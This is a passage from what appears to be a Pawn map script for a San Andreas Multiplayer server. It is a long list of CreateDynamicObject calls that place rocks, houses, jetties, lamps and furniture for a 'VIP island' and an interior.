	CreateDynamicObject(4099, 492.245819, -24.417608, 1007.486206, 0.000000, 0.000000, 48.220626);
	CreateDynamicObject(4099, 492.245819, -24.417608, 1010.829101, 0.000000, 0.000000, 48.220626);
	CreateDynamicObject(1744, 493.405975, -2.752362, 1008.108032, 0.000000, 0.000000, 0.702838);
	CreateDynamicObject(1780, 490.929534, -12.871144, 1007.147766, 90.000000, -102.000000, 100.665374);
	CreateDynamicObject(1780, 491.000457, -10.733198, 1007.147766, 90.000000, -102.000000, 99.665374);
	CreateDynamicObject(1780, 491.044006, -9.667399, 1007.153991, 90.000000, -102.000000, 99.665374);
	CreateDynamicObject(644, 487.891235, -4.049901, 1006.772460, 0.000000, 0.000000, 63.922946);
	CreateDynamicObject(949, 505.383361, -10.263215, 1007.098388, 0.000000, 0.000000, 238.741119);
	CreateDynamicObject(1704, 493.136627, -4.697628, 1006.333801, 0.000000, 0.000000, 51.076072);
	CreateDynamicObject(1704, 493.699737, -6.953307, 1006.333801, 0.000000, 0.000000, 133.076080);
	CreateDynamicObject(367, 494.465820, -3.157248, 1008.482910, 0.000000, 7.000000, -26.840393);
	CreateDynamicObject(2253, 495.417236, -4.422882, 1007.269165, 0.000000, 0.000000, 231.809143);
	CreateDynamicObject(1510, 494.716583, -4.616878, 1007.017761, 0.000000, 0.000000, 354.916625);
	CreateDynamicObject(1485, 494.658447, -4.458745, 1007.048645, 60.000000, 0.000000, 302.589416);
	CreateDynamicObject(1486, 495.398498, -5.524003, 1007.150085, 0.000000, 0.000000, 335.417205);
	CreateDynamicObject(1808, 489.848022, -3.072714, 1006.455566, 0.000000, 0.000000, 356.400299);
	CreateDynamicObject(2465, 493.650482, -3.113512, 1008.696533, 0.000000, 0.000000, 357.246856);

	//VIP island
	CreateDynamicObject(5297, 3025.54, -1092.71, 13.25,   0.00, 0.00, 180.00);
	CreateDynamicObject(5297, 2915.66, -1092.73, 13.25,   0.00, 0.00, 360.00);
	CreateDynamicObject(8664, 3142.56, -1063.13, 7.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(3749, 3069.48, -1092.96, 13.48,   0.00, 0.00, 90.00);
	CreateDynamicObject(16133, 3096.04, -1138.40, 0.60,   0.00, 0.00, 84.83);
	CreateDynamicObject(16121, 3166.03, -992.39, -3.97,   0.00, 0.00, 65.09);
	CreateDynamicObject(16139, 3067.95, -1121.33, -2.44,   0.00, 0.00, 63.05);
	CreateDynamicObject(16122, 3164.28, -1139.89, -0.02,   0.00, 0.00, 301.83);
	CreateDynamicObject(624, 3074.94, -1084.58, 6.73,   0.00, 0.00, 0.00);
	CreateDynamicObject(624, 3074.94, -1100.70, 6.73,   0.00, 0.00, 0.00);
	CreateDynamicObject(16692, 3095.08, -1217.95, -39.60,   0.00, 0.00, 224.43);
	CreateDynamicObject(16121, 3067.53, -1057.64, -3.24,   0.00, 0.00, 341.05);
	CreateDynamicObject(16121, 3066.23, -1011.78, -3.24,   0.00, 0.00, 338.96);
	CreateDynamicObject(16121, 3085.19, -990.63, -3.24,   0.00, 0.00, 74.47);
	CreateDynamicObject(16121, 3126.99, -990.96, -3.97,   0.00, 0.00, 66.36);

	//vip island
	CreateDynamicObject(9596,3310.50000000,81.80664062,-7.99384451,0.00000000,0.00000000,193.99108887); //object(land_04_sfw) (1)
	CreateDynamicObject(5428,3330.46582031,122.71191406,2.45637178,0.00000000,0.00000000,69.97192383); //object(laejeffers10) (1)
	CreateDynamicObject(5428,3309.45410156,67.72070312,2.45637178,0.00000000,0.00000000,249.99389648); //object(laejeffers10) (2)
	CreateDynamicObject(9530,3291.46191406,74.23730469,-6.59674978,0.00000000,0.00000000,329.99633789); //object(sandbch_sfw02) (1)
	CreateDynamicObject(18368,3264.14843750,109.44824219,-1.04681289,0.00000000,0.00000000,153.74816895); //object(cs_mountplat) (1)
	CreateDynamicObject(18368,3254.54394531,21.55078125,-0.92181301,0.00000000,0.00000000,202.74169922); //object(cs_mountplat) (2)
	CreateDynamicObject(5520,3288.67504883,114.56153870,7.31533289,0.00000000,0.00000000,68.99414062); //object(bdupshouse_lae) (1)
	CreateDynamicObject(13725,3377.74951172,240.36473083,6.12433434,0.00000000,0.00000000,157.48364258); //object(opmans01_cunte) (1)
	CreateDynamicObject(9530,3380.29394531,126.61035156,-3.77174473,0.00000000,0.00000000,215.98571777); //object(sandbch_sfw02) (1)
	CreateDynamicObject(18228,3314.94042969,183.01171875,-7.75000000,0.00000000,0.00000000,357.99499512); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(18228,3320.16210938,193.77259827,-2.75000000,0.00000000,0.00000000,349.99145508); //object(cunt_rockgp2_21) (2)
	CreateDynamicObject(900,3315.95117188,180.72167969,4.13534451,11.24450684,0.00000000,17.74291992); //object(searock04) (1)
	CreateDynamicObject(11490,3318.25976562,94.49023438,2.15938950,0.00000000,0.00000000,69.73022461); //object(des_ranch) (1)
	CreateDynamicObject(11491,3328.65917969,90.70312500,3.65939188,0.00000000,0.00000000,69.98291016); //object(des_ranchbits1) (1)
	CreateDynamicObject(4825,3496.76757812,142.84765625,3.35652399,0.00000000,0.00000000,215.98571777); //object(griffithoblas) (1)
	CreateDynamicObject(18228,3431.95312500,158.63867188,-1.25000000,0.00000000,355.98449707,349.98046875); //object(cunt_rockgp2_21) (3)
	CreateDynamicObject(18228,3456.54565430,173.12644958,-1.25000000,0.00000000,0.00000000,185.73303223); //object(cunt_rockgp2_21) (4)
	CreateDynamicObject(18228,3483.68847656,193.28808594,-1.25000000,0.00000000,0.00000000,189.98657227); //object(cunt_rockgp2_21) (5)
	CreateDynamicObject(18228,3490.88476562,77.61328125,-1.25000000,0.00000000,0.00000000,159.98840332); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3510.17285156,202.49023438,-8.00000000,0.00000000,0.00000000,105.99060059); //object(cunt_rockgp2_21) (9)
	CreateDynamicObject(18228,3526.00488281,204.19238281,-7.00000000,0.00000000,0.00000000,189.97558594); //object(cunt_rockgp2_21) (10)
	CreateDynamicObject(18228,3517.74804688,197.34082031,-7.00000000,0.00000000,0.00000000,251.97692871); //object(cunt_rockgp2_21) (11)
	CreateDynamicObject(8832,3352.61328125,184.88183594,4.94612408,0.00000000,5.99853516,247.99438477); //object(pirtebrdg01_lvs) (1)
	CreateDynamicObject(9530,3372.22363281,-1.31933594,-5.17174816,0.00000000,1.99951172,71.99340820); //object(sandbch_sfw02) (1)
	CreateDynamicObject(18228,3470.00195312,61.88378906,-1.25000000,0.00000000,0.00000000,159.98840332); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3458.72851562,-9.81445312,-2.50000000,0.00000000,0.00000000,229.98229980); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3467.13964844,-18.85546875,-2.50000000,0.00000000,0.00000000,319.98229980); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3263.03613281,-10.69140625,-3.72499990,0.00000000,3.99353027,241.98486328); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(9596,3337.12792969,39.86328125,-7.84384394,0.00000000,0.00000000,163.98193359); //object(land_04_sfw) (1)
	CreateDynamicObject(9596,3329.96386719,-13.60742188,-7.01884079,0.00000000,4.74609375,291.98364258); //object(land_04_sfw) (1)
	CreateDynamicObject(3580,3297.78906250,38.45507812,6.38758087,0.00000000,0.00000000,335.99487305); //object(compbigho2_lae) (1)
	CreateDynamicObject(3608,3284.24511719,-27.78710938,-1.05532050,0.00000000,0.00000000,161.99340820); //object(hillhouse08_la) (1)
	CreateDynamicObject(18228,3318.83496094,-50.03882217,-5.24999905,0.00000000,3.98803711,267.72583008); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3384.75268555,-45.67675018,-3.75000000,0.00000000,3.98803711,135.96582031); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(3648,3321.82202148,29.34291077,4.49712229,0.00000000,0.00000000,284.74365234); //object(ganghous02_lax) (1)
	CreateDynamicObject(18228,3277.29199219,147.67382812,-0.79999995,0.00000000,0.00000000,205.99365234); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(18228,3248.00390625,58.62643433,-3.07500291,0.00000000,0.00000000,207.49365234); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(9596,3344.50878906,83.74902344,-7.11884117,3.98254395,4.75708008,237.65075684); //object(land_04_sfw) (1)
	CreateDynamicObject(18228,3389.31933594,7.17382812,-1.14999831,0.00000000,0.00000000,243.97338867); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3393.20898438,58.60903168,3.82500863,0.00000000,0.00000000,43.45642090); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3411.33496094,75.75683594,1.24999988,0.00000000,0.00000000,21.97814941); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3406.92968750,109.48828125,-2.50000000,0.00000000,355.99548340,91.97753906); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(18228,3384.41601562,119.21679688,-4.00000000,0.00000000,355.98999023,120.22073364); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(3886,3445.29101562,55.35546875,1.41061020,0.00000000,0.49987793,215.98571777); //object(ws_jettynol_sfx) (4)
	CreateDynamicObject(3886,3451.45605469,46.90917969,1.38561022,0.00000000,0.49987793,215.98571777); //object(ws_jettynol_sfx) (8)
	CreateDynamicObject(3886,3458.39941406,47.71289062,1.33561027,0.00000000,0.49987793,293.99414062); //object(ws_jettynol_sfx) (10)
	CreateDynamicObject(3886,3467.56347656,50.84277344,1.36061025,0.00000000,0.49987793,279.98657227); //object(ws_jettynol_sfx) (11)
	CreateDynamicObject(18228,3486.75683594,5.17089844,-2.50000000,0.00000000,0.00000000,133.97827148); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(1601,3451.22094727,45.23049545,-1.14589524,0.00000000,0.00000000,34.00000000); //object(fish3s) (1)
	CreateDynamicObject(18228,3427.42187500,177.51464844,-1.25000000,0.00000000,355.98449707,335.99487305); //object(cunt_rockgp2_21) (3)
	CreateDynamicObject(3406,3499.34667969,216.59375000,11.87501335,0.00000000,0.00000000,281.99157715); //object(cxref_woodjetty) (1)
	CreateDynamicObject(18228,3502.29785156,215.07812500,-12.22497749,0.00000000,0.00000000,327.97485352); //object(cunt_rockgp2_21) (11)
	CreateDynamicObject(6295,3498.48828125,9.22753906,30.57152176,0.00000000,0.00000000,315.24169922); //object(sanpedlithus_law2) (1)
	CreateDynamicObject(9241,3482.36230469,153.64257812,5.90761042,0.00000000,0.00000000,35.74401855); //object(copbits_sfn) (1)
	CreateDynamicObject(9241,3502.16015625,126.30957031,5.90761042,0.00000000,0.00000000,35.74401855); //object(copbits_sfn) (2)
	CreateDynamicObject(9241,3467.75781250,100.85156250,5.90761042,0.00000000,0.00000000,125.74401855); //object(copbits_sfn) (3)
	CreateDynamicObject(9241,3448.41894531,127.92382812,5.90761042,0.00000000,0.00000000,125.74401855); //object(copbits_sfn) (4)
	CreateDynamicObject(10829,3354.25292969,92.03515625,3.63941240,0.00000000,0.00000000,69.24682617); //object(gatehouse1_sfse) (1)
	CreateDynamicObject(9241,3342.34667969,6.55566406,2.60759783,0.00000000,0.00000000,291.73645020); //object(copbits_sfn) (7)
	CreateDynamicObject(689,3382.87841797,94.00727081,2.60782003,0.00000000,0.00000000,0.00000000); //object(sm_fir_copse1) (1)
	CreateDynamicObject(689,3372.94897461,61.56111908,-1.39217997,0.00000000,0.00000000,0.00000000); //object(sm_fir_copse1) (2)
	CreateDynamicObject(689,3358.99487305,31.75483704,-1.39217997,0.00000000,0.00000000,314.00000000); //object(sm_fir_copse1) (3)
	CreateDynamicObject(689,3308.35546875,22.47753906,1.10782003,0.00000000,0.00000000,0.00000000); //object(sm_fir_copse1) (4)
	CreateDynamicObject(690,3285.83105469,15.51562500,-4.53436756,0.00000000,0.00000000,35.99670410); //object(sm_fir_copse2) (1)
	CreateDynamicObject(708,3306.94628906,66.78222656,2.32426596,0.00000000,0.00000000,0.00000000); //object(sm_veg_tree4_vbig) (1)
	CreateDynamicObject(708,3327.94238281,124.34667969,2.52426672,0.00000000,0.00000000,0.00000000); //object(sm_veg_tree4_vbig) (2)
	CreateDynamicObject(18268,3361.82812500,47.47070312,23.95587349,0.00000000,0.00000000,59.98535156); //object(cw2_mntfir05) (1)
	CreateDynamicObject(3948,3284.66625977,44.93557358,10.52125359,0.00000000,353.99597168,87.99499512); //object(bistrogarden) (1)
	CreateDynamicObject(689,3361.30029297,150.94712830,-3.89217997,0.00000000,0.00000000,0.00000000); //object(sm_fir_copse1) (5)
	CreateDynamicObject(803,3317.93164062,20.75097656,1.83785188,0.00000000,0.00000000,0.00000000); //object(genveg_bush09) (1)
	CreateDynamicObject(803,3320.91503906,22.03940201,1.83785188,0.00000000,0.00000000,348.00000000); //object(genveg_bush09) (1)
	CreateDynamicObject(803,3383.59301758,-14.44105530,3.33785200,0.00000000,0.00000000,347.99743652); //object(genveg_bush09) (1)
	CreateDynamicObject(16326,3377.59179688,46.50000000,4.09871340,0.00000000,0.00000000,83.98498535); //object(des_byoffice) (1)
	CreateDynamicObject(7662,3330.79492188,72.76074219,2.10343361,0.00000000,0.00000000,339.99938965); //object(miragehedge14) (1)
	CreateDynamicObject(7662,3297.06542969,84.22363281,2.10343361,0.00000000,0.00000000,339.99938965); //object(miragehedge14) (2)
	CreateDynamicObject(14872,3300.51367188,7.16992188,2.67883015,0.00000000,357.98950195,13.99108887); //object(kylie_logs) (5)
	CreateDynamicObject(621,3401.96972656,9.98144531,1.72668266,0.00000000,0.00000000,0.00000000); //object(veg_palm02) (1)
	CreateDynamicObject(621,3422.39453125,53.52636719,1.87668705,0.00000000,0.00000000,0.00000000); //object(veg_palm02) (2)
	CreateDynamicObject(896,3382.58959961,-11.24038506,0.42992020,0.00000000,0.00000000,0.00000000); //object(searock06) (1)
	CreateDynamicObject(3619,3282.90332031,85.24023438,5.70586586,0.00000000,0.00000000,70.49926758); //object(nwlaw2husjm4_law2) (1)
	CreateDynamicObject(3609,3346.54101562,-46.45703125,7.26892853,0.00000000,0.00000000,351.46362305); //object(hillhouse13_la) (1)
	CreateDynamicObject(17554,3337.06347656,-45.60253906,-15.05982208,0.00000000,0.00000000,81.74377441); //object(beachblok5_lae2) (1)
	CreateDynamicObject(17554,3340.46582031,-37.61816406,-12.15294075,0.00000000,0.00000000,171.49108887); //object(beachblok5_lae2) (2)
	CreateDynamicObject(3886,3360.13574219,-48.90234375,1.41061020,0.00000000,0.49987793,171.46911621); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(3461,3367.63867188,46.85937500,5.14220524,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
	CreateDynamicObject(3461,3325.34863281,91.90527344,2.29219437,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (2)
	CreateDynamicObject(2064,3351.29003906,-52.80468750,9.38732433,0.00000000,0.00000000,349.73327637); //object(cj_feildgun) (1)
	CreateDynamicObject(3598,3304.39550781,141.24792480,4.22046614,0.00000000,0.00000000,69.49951172); //object(hillhouse01_la) (1)
	CreateDynamicObject(689,3320.57543945,159.30253601,-1.49217963,0.00000000,0.00000000,0.00000000); //object(sm_fir_copse1) (5)
	CreateDynamicObject(2358,3354.03417969,-53.14746094,8.87469292,0.00000000,0.00000000,178.98925781); //object(ammo_box_c2) (2)
	CreateDynamicObject(1704,3318.82324219,93.87988281,3.65808916,0.00000000,0.00000000,69.24682617); //object(kb_chair03) (1)
	CreateDynamicObject(1704,3323.98046875,94.88085938,3.63309193,0.00000000,0.00000000,339.74121094); //object(kb_chair03) (2)
	CreateDynamicObject(1567,3371.77612305,47.09701157,4.63870716,0.00000000,0.00000000,354.99572754); //object(gen_wardrobe) (1)
	CreateDynamicObject(3004,3371.99829102,40.50272369,7.46812630,356.50000000,0.00000000,5.50000000); //object(k_poolq2) (1)
	CreateDynamicObject(1616,3495.32763672,12.71062946,13.42511463,0.00000000,0.00000000,302.00000000); //object(nt_securecam1_01) (1)
	CreateDynamicObject(14651,3372.59716797,41.10458374,8.65867233,0.00000000,0.00000000,354.00000000); //object(trukstp05) (1)
	CreateDynamicObject(16151,3320.53906250,89.90527344,3.99219656,0.00000000,0.00000000,249.74121094); //object(ufo_bar) (1)
	CreateDynamicObject(3004,3372.60766602,40.90208817,8.09313679,284.69030762,72.54901123,301.99682617); //object(k_poolq2) (2)
	CreateDynamicObject(1828,3322.24121094,92.99835205,3.64220381,0.00000000,0.00000000,0.00000000); //object(man_sdr_rug) (1)
	CreateDynamicObject(2002,3315.55078125,97.84863281,3.64219999,0.00000000,0.00000000,69.24682617); //object(water_coolnu) (1)
	CreateDynamicObject(2104,3313.31738281,93.48730469,3.61719418,0.00000000,0.00000000,69.49951172); //object(swank_hi_fi) (1)
	CreateDynamicObject(2229,3313.09863281,92.75878906,3.66719723,0.00000000,0.00000000,85.99548340); //object(swank_speaker) (1)
	CreateDynamicObject(1432,3327.06542969,87.14746094,3.78869629,0.00000000,0.00000000,4.24621582); //object(dyn_table_2) (1)
	CreateDynamicObject(1594,3248.72070312,33.22167969,4.01570034,0.00000000,0.00000000,0.00000000); //object(chairsntable) (1)
	CreateDynamicObject(1723,3320.53125000,95.34667969,3.66719437,0.00000000,0.00000000,355.24841309); //object(mrk_seating1) (1)
	CreateDynamicObject(1775,3316.21972656,99.28515625,4.68923330,0.00000000,0.00000000,38.49609375); //object(cj_sprunk1) (1)
	CreateDynamicObject(2229,3313.94335938,94.40136719,3.66719723,0.00000000,0.00000000,45.99426270); //object(swank_speaker) (2)
	CreateDynamicObject(1432,3328.51855469,90.62402344,3.76369905,0.00000000,0.00000000,54.24499512); //object(dyn_table_2) (2)
	CreateDynamicObject(1594,3250.52050781,25.47851562,3.96570015,0.00000000,0.00000000,0.00000000); //object(chairsntable) (2)
	CreateDynamicObject(1594,3268.12500000,122.45312500,3.84069967,0.00000000,0.00000000,0.00000000); //object(chairsntable) (3)
	CreateDynamicObject(1594,3264.47949219,114.46093750,3.91569996,0.00000000,0.00000000,0.00000000); //object(chairsntable) (4)
	CreateDynamicObject(1231,3337.83642578,77.78538513,2.50706911,0.00000000,0.00000000,65.74768066); //object(streetlamp2) (1)
	CreateDynamicObject(1231,3345.33300781,99.07714844,2.48206902,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (2)
	CreateDynamicObject(1231,3344.20532227,123.15502167,2.48206902,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (3)
	CreateDynamicObject(1231,3320.00390625,56.73242188,2.50706911,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (4)
	CreateDynamicObject(1231,3301.81176758,84.11882019,2.50706911,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (5)
	CreateDynamicObject(1231,3297.80688477,100.64514923,2.48206902,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (6)
	CreateDynamicObject(1231,3312.07641602,112.33055878,2.50706911,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (7)
	CreateDynamicObject(1231,3309.48071289,132.70317078,2.48206902,0.00000000,0.00000000,70.49377441); //object(streetlamp2) (8)
	CreateDynamicObject(1231,3330.26269531,137.39746094,2.48206902,0.00000000,0.00000000,152.49377441); //object(streetlamp2) (9)
	CreateDynamicObject(1231,3458.47460938,157.60351562,6.78207159,0.00000000,0.00000000,216.48559570); //object(streetlamp2) (17)
	CreateDynamicObject(1231,3482.04296875,89.66601562,6.78206682,0.00000000,0.00000000,216.48559570); //object(streetlamp2) (18)
	CreateDynamicObject(1231,3499.29882812,102.13671875,6.75707150,0.00000000,0.00000000,216.48559570); //object(streetlamp2) (19)
	CreateDynamicObject(1231,3526.36230469,128.37109375,6.75706768,0.00000000,0.00000000,126.48559570); //object(streetlamp2) (20)
	CreateDynamicObject(1231,3492.24218750,175.25195312,6.75706720,0.00000000,0.00000000,126.48559570); //object(streetlamp2) (21)
	CreateDynamicObject(1231,3312.45507812,40.82617188,2.50706911,0.00000000,0.00000000,355.23889160); //object(streetlamp2) (22)
	CreateDynamicObject(1231,3289.03515625,53.40018463,2.50706911,0.00000000,0.00000000,304.73886108); //object(streetlamp2) (23)
	CreateDynamicObject(3525,3517.40332031,154.34852600,9.06766510,0.00000000,0.00000000,306.00000000); //object(exbrtorch01) (2)
	CreateDynamicObject(3525,3514.15039062,158.83398438,9.06766510,0.00000000,0.00000000,305.99121094); //object(exbrtorch01) (3)
	CreateDynamicObject(3524,3501.55712891,215.22163391,11.80905342,0.00000000,0.00000000,192.00000000); //object(skullpillar01_lvs) (1)
	CreateDynamicObject(3524,3343.92675781,-41.39062500,11.53811836,0.00000000,0.00000000,172.24365234); //object(skullpillar01_lvs) (2)
	CreateDynamicObject(1290,3473.29150391,125.74353790,12.19757557,0.00000000,0.00000000,0.00000000); //object(lamppost2) (1)
	CreateDynamicObject(1290,3473.27221680,125.80566406,12.19757557,0.00000000,0.00000000,267.75000000); //object(lamppost2) (2)
	CreateDynamicObject(2681,3373.36035156,46.20312500,6.68565083,0.00000000,0.00000000,353.49609375); //object(cj_coin_op) (1)
	CreateDynamicObject(2778,3371.74121094,46.38574219,6.69391394,0.00000000,0.00000000,354.24865723); //object(cj_coin_op_1) (1)
	CreateDynamicObject(2779,3372.56054688,46.29980469,6.67355585,0.00000000,0.00000000,353.99597168); //object(cj_coin_op_2) (1)
	CreateDynamicObject(1541,3322.02148438,89.89550781,4.80315733,0.00000000,0.00000000,159.99938965); //object(cj_beer_taps_1) (1)
	CreateDynamicObject(951,3546.20800781,178.88378906,12.01584816,0.00000000,0.00000000,105.99060059); //object(cj_view_tele2) (1)
	CreateDynamicObject(11493,3545.22265625,205.13867188,4.34771395,0.00000000,0.00000000,135.99426270); //object(des_ranchbot) (1)
	CreateDynamicObject(18228,3541.87597656,199.49511719,-14.72499466,0.00000000,1.99951172,345.98693848); //object(cunt_rockgp2_21) (9)
	CreateDynamicObject(18228,3538.62182617,206.29396057,-14.72499466,0.00000000,1.99951172,267.98693848); //object(cunt_rockgp2_21) (9)
	CreateDynamicObject(18228,3531.48046875,194.92578125,-12.29998970,0.00000000,1.99951172,295.97717285); //object(cunt_rockgp2_21) (9)
	CreateDynamicObject(897,3554.82812500,204.62988281,0.00000000,0.00000000,0.00000000,347.73925781); //object(searock01) (3)
	CreateDynamicObject(897,3526.61230469,192.29785156,6.35000706,31.65710449,288.10546875,73.81164551); //object(searock01) (4)
	CreateDynamicObject(1243,3508.39208984,40.52851868,-2.61479950,0.00000000,0.00000000,0.00000000); //object(bouy) (2)
	CreateDynamicObject(3886,3477.85644531,52.67480469,1.38561022,0.00000000,0.49987793,280.22277832); //object(ws_jettynol_sfx) (11)
	CreateDynamicObject(951,3287.09570312,105.08439636,12.36586571,0.00000000,0.00000000,269.24194336); //object(cj_view_tele2) (2)
	CreateDynamicObject(642,3250.43945312,25.41406250,4.81386280,0.73608398,358.49487305,353.25988770); //object(kb_canopy_test) (3)
	CreateDynamicObject(642,3248.64648438,33.15917969,4.86386299,0.73059082,358.49487305,353.25988770); //object(kb_canopy_test) (4)
	CreateDynamicObject(1215,3364.42089844,188.65565491,9.15496063,0.00000000,0.00000000,0.00000000); //object(bollardlight) (14)
	CreateDynamicObject(1215,3351.21313477,194.06291199,9.05496216,0.00000000,0.00000000,0.00000000); //object(bollardlight) (15)
	CreateDynamicObject(1215,3356.80737305,207.56292725,10.05497360,0.00000000,0.00000000,0.00000000); //object(bollardlight) (16)
	CreateDynamicObject(1215,3369.88769531,202.24511719,9.97997475,0.00000000,0.00000000,0.00000000); //object(bollardlight) (17)
	CreateDynamicObject(1215,3376.10351562,217.64648438,9.70497894,0.00000000,0.00000000,0.00000000); //object(bollardlight) (18)
	CreateDynamicObject(1215,3362.98364258,223.03195190,9.57998085,0.00000000,0.00000000,0.00000000); //object(bollardlight) (19)
	CreateDynamicObject(1255,3365.75976562,221.97460938,9.85059357,0.00000000,0.00000000,283.99658203); //object(lounger) (3)
	CreateDynamicObject(1255,3368.56201172,220.88873291,9.85059357,0.00000000,0.00000000,229.99658203); //object(lounger) (4)
	CreateDynamicObject(3886,3343.93090820,205.44114685,1.46061015,0.00000000,0.49987793,156.97265625); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3265,3356.99438477,-56.46518326,2.55571413,0.00000000,0.00000000,351.99096680); //object(privatesign4) (2)
	CreateDynamicObject(896,3332.62109375,-38.09960938,2.32855964,9.93164062,173.90258789,34.05236816); //object(searock06) (2)
	CreateDynamicObject(17027,3326.34423828,-41.10935974,0.40659738,303.99719238,0.00000000,79.99121094); //object(cunt_rockgp1_03) (3)
	CreateDynamicObject(18228,3325.68774414,-38.96041107,-11.45500374,0.00000000,1.73583984,239.72167969); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(3525,3346.35351562,-42.72460938,6.50321674,0.00000000,0.00000000,171.24938965); //object(exbrtorch01) (4)
	CreateDynamicObject(2358,3353.06152344,-53.00390625,8.87467766,0.00000000,0.00000000,161.98242188); //object(ammo_box_c2) (2)
	CreateDynamicObject(1231,3529.94018555,197.99018860,10.25706863,0.00000000,0.00000000,24.48559570); //object(streetlamp2) (21)
	CreateDynamicObject(1231,3540.63940430,201.73536682,7.05706882,0.00000000,0.00000000,36.48010254); //object(streetlamp2) (21)
	CreateDynamicObject(1231,3550.08300781,206.83398438,2.50706863,0.00000000,0.00000000,24.47753906); //object(streetlamp2) (21)
	CreateDynamicObject(3886,3275.82421875,-41.58691406,1.88561118,0.00000000,359.48913574,251.96044922); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(3886,3285.75390625,-44.83789062,1.88560975,0.00000000,359.47814941,251.96044922); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(1458,3404.93261719,88.96484375,7.13984871,7.86621094,349.90356445,318.13659668); //object(dyn_cart) (1)
	CreateDynamicObject(2237,3405.25390625,88.95312500,8.36971092,287.99011230,0.00000000,195.99060059); //object(cj_shovel2) (1)
	CreateDynamicObject(3261,3404.97363281,83.16894531,7.33449984,354.74304199,0.00000000,49.74609375); //object(grasshouse) (1)
	CreateDynamicObject(2901,3405.57812500,89.07031250,7.92408371,352.47436523,20.17089844,42.74230957); //object(kmb_marijuana) (1)
	CreateDynamicObject(3785,3348.99023438,-64.55761719,0.51906037,0.00000000,0.00000000,351.49108887); //object(bulkheadlight) (2)
	CreateDynamicObject(3785,3350.04980469,-57.33203125,0.49406037,0.00000000,0.00000000,351.99096680); //object(bulkheadlight) (3)
	CreateDynamicObject(3886,3560.83007812,228.07812500,1.06061053,0.00000000,0.49987793,181.49414062); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3551.12402344,227.89550781,1.06061053,0.00000000,0.49987793,1.74133301); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3556.37109375,215.39746094,-0.38938907,0.00000000,0.49987793,181.24145508); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(11494,3556.08007812,227.03710938,1.87499881,0.00000000,0.00000000,315.74707031); //object(des_rnchbhous) (1)
	CreateDynamicObject(3886,3561.07128906,217.60937500,1.03561056,0.00000000,0.49987793,1.74133301); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(897,3559.59497070,208.57472229,-2.82499456,0.00000000,0.00000000,107.98043823); //object(searock01) (3)
	CreateDynamicObject(11494,3556.30078125,216.58398438,1.82499886,0.00000000,0.00000000,315.74707031); //object(des_rnchbhous) (3)
	CreateDynamicObject(3886,3551.39746094,217.44726562,1.06061053,0.00000000,0.49987793,0.98876953); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(690,3313.48120117,0.07568821,-4.53436756,0.00000000,0.00000000,35.99670410); //object(sm_fir_copse2) (1)
	CreateDynamicObject(3471,3350.13964844,185.06712341,8.90632439,0.00000000,0.00000000,247.99998474); //object(vgschinalion1) (1)
	CreateDynamicObject(3471,3512.17797852,158.08517456,7.90122414,0.00000000,0.00000000,215.99995422); //object(vgschinalion1) (2)
	CreateDynamicObject(3265,3511.81616211,159.16438293,8.60938549,0.00000000,0.00000000,36.00000000); //object(privatesign4) (3)
	CreateDynamicObject(3471,3358.94140625,181.54492188,8.90632439,0.00000000,0.00000000,247.99438477); //object(vgschinalion1) (3)
	CreateDynamicObject(3471,3516.03100586,152.75001526,7.90122414,0.00000000,0.00000000,215.99670410); //object(vgschinalion1) (4)
	CreateDynamicObject(3496,3326.08398438,133.73046875,2.21806312,0.00000000,0.49987793,248.24707031); //object(vgsxrefbballnet) (1)
	CreateDynamicObject(3496,3339.67578125,127.47265625,2.21806312,0.00000000,0.74157715,67.49450684); //object(vgsxrefbballnet) (2)
	CreateDynamicObject(3243,3294.31835938,7.38867188,2.32589650,0.00000000,0.00000000,305.49133301); //object(tepee_room_) (1)
	CreateDynamicObject(3243,3305.04199219,5.92285156,2.27589631,0.00000000,0.00000000,29.99267578); //object(tepee_room_) (2)
	CreateDynamicObject(3243,3297.98535156,20.09570312,2.17589593,0.00000000,0.00000000,206.73522949); //object(tepee_room_) (3)
	CreateDynamicObject(1463,3300.92871094,11.70312500,2.66319370,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (1)
	CreateDynamicObject(3461,3300.76757812,11.56152344,1.06721139,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
	CreateDynamicObject(1557,3534.97167969,159.40623474,5.82057762,0.00000000,0.00000000,35.74401855); //object(gen_doorext19) (2)
	CreateDynamicObject(1557,3537.41992188,161.17933655,5.82057762,0.00000000,0.00000000,215.99670410); //object(gen_doorext19) (3)
	CreateDynamicObject(3525,3534.76635742,159.04974365,7.19266748,0.00000000,0.00000000,37.99121094); //object(exbrtorch01) (3)
